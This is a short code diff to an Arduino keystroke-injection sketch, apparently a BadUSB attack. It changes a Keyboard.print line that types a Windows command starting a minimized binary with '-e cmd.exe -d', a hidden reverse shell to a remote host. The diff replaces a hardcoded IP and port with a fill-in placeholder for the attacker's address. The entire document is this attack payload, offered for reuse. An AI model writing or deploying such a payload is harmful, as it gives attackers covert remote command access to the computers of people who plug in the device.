@@ -99,7 +99,7 @@ void setup()
 
   delay(3000);
 
-  Keyboard.print("START /MIN a.exe 192.168.1.195 8080 -e cmd.exe -d & exit");
+  Keyboard.print("START /MIN a.exe <YOUR IP AND PORT. REMOVE "<>" AFTER ENTERING IP AND PORT> -e cmd.exe -d & exit");
 
   typeKey(KEY_RETURN);
 }
